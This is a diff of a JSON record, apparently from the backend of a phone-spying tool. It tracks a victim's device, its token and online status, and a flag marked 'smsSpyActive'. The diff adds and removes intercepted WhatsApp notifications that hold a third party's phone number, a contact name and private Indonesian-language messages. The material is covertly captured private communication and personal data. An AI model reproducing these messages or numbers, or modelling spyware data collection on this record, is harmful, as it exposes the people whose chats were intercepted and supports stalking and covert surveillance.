@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776907545425,
+    "lastSeen": 1776907569466,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 39 chat",
+        "time": "23/04 09:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776907545941
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-1746-5790",
+        "content": "bantuin keluar dulu sayang",
+        "time": "23/04 09:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776907545929
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "22/04 18:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1776853680224
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎57 pesan dari 36 chat",
-        "time": "22/04 18:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776853659052
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "gatau blm liat",
-        "time": "22/04 18:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776853658929
       }
     ],
     "galleryPhotos": [],
